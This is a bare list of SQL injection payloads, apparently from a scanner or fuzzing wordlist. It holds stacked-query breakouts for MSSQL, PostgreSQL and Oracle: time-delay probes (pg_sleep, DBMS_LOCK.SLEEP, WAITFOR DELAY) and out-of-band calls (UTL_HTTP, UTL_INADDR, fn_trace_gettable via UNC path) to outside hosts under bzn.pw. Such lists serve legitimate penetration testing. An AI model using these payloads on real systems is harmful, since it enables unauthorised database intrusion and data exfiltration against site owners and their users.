+')); select (select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default));  -- 
+')); select (select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)); /* 
+')); select pg_sleep(10) is not null;  -- 
+')); select pg_sleep(10) is not null; /* 
+')); select UTL_INADDR.get_host_name('10.0.0.1') from dual;  -- 
+')); select UTL_INADDR.get_host_name('10.0.0.1') from dual; /* 
+')); select UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw') from dual;  -- 
+')); select UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw') from dual; /* 
+')); select UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw') from dual;  -- 
+')); select UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw') from dual; /* 
 '))); BEGIN DBMS_LOCK.SLEEP(10); END;;  -- 
 '))); BEGIN DBMS_LOCK.SLEEP(10); END;; /* 
 '))); WAITFOR DELAY '00:00:10';  -- 
